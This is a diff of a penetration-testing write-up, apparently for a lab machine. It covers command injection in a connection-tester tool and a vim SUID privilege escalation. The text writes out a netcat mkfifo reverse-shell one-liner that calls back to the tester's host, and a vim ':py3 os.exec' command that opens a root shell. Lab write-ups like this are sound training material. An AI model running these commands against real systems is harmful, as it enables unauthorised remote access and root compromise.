@@ -22,7 +22,7 @@ IP: 192.168.127.86
 ## Used tools
 - nmap
 - rustscan
-- gobuster
+
 
 ---
 
@@ -157,6 +157,7 @@ Enumerated top 200 UDP ports:
 
 # Exploitation
 ## Name of the technique
+## Command injection from connection tester tool
 
 #### I attempted to type the usual netcat one liner reverse shell syntax but didn't work. I then tried "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [kali IP] [Listener Port] >/tmp/f" found in "pentestmonkey.net" but had to modify it to the following in order to get it to work: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.53.200 80 >/tmp/f" (the modification I added was the "-f" after command "rm") 
 
@@ -174,10 +175,15 @@ Enumerated top 200 UDP ports:
 
 
 ## Privilege Escalation vector
+## VIM SUID Binary
 
 #### Found "vim" in GTFOBins site and followed the instructions to run the binary and type colon to enter "enter command mode" and prepend py3 to the command as the machine only has python3 and typed ":py3 import os; os.exec("/bin/sh", "sh", "-pc", "reset; exec sh -p")" and then enter and then when asked "which terminal?" Enter "xterm" and then received a root shell: 
 
+![](Pasted%20image%2020221018184110.png)
 
+![](Pasted%20image%2020221018184146.png)
 
+![](Pasted%20image%2020221018184222.png)
+#VIMsuidBinary
 ---
 
